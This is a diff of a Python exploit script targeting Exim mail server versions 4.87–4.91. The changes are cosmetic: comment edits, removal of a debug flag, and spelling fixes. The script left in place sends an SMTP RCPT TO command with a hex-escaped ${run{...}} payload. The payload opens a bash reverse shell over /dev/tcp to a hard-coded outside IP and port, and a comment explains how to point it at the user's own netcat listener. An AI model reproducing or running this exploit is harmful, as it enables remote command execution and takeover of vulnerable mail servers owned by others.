@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #For ssl port you mast be use a socat 
-#Exim 4.87 - 4.91(inluded)
+#Exim 4.87 - 4.91
 
 import time
 import sys
@@ -11,7 +11,6 @@ host = 'localhost'
 ip = "127.0.0.1"
 port = 25
 user = "root"
-debag =  False
 bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 payload = "${run{\\x2fbin\\x2fbash\\x20-c\\x20\\x22bash\\x20-i\\x20\\x3e\\x26\\x20\\x2fdev\\x2ftcp\\x2f190\\x2e115\\x2e18\\x2e115\\x2f5055\\x200\\x3e\\x261\\x22}}"
 #  /bin/bash -c  "bash -i 0> /dev/tcp/   HOST   /   PORT     0>&"  HOST and PORT it's your own host with netcat listener for rewers shell
@@ -32,10 +31,6 @@ def exploit():
         write("MAIL FROM:<>") 
         print(re())
         write("RCPT TO:%s%s@%s" %(user,payload,host)) # send payload 
-        if debag == True:
-            print("%s" % user)
-            print("%s" % payload)
-            print("%s" % host)
         time.sleep(2)
         o = re()
         print(o)
@@ -53,7 +48,7 @@ def exploit():
         write("")
         write(".") # payload start
         print(re())
-        print("You have 30 sec for you revers shall \n\t[!] Exit when complit. VOID shall -  if you exit now")
+        print("You have 30 sec for you revers shell \n\t[!] Exit when complit. VOID shell -  if you exit now")
         print("\t[!] Enter for exit")
         input()
     except:
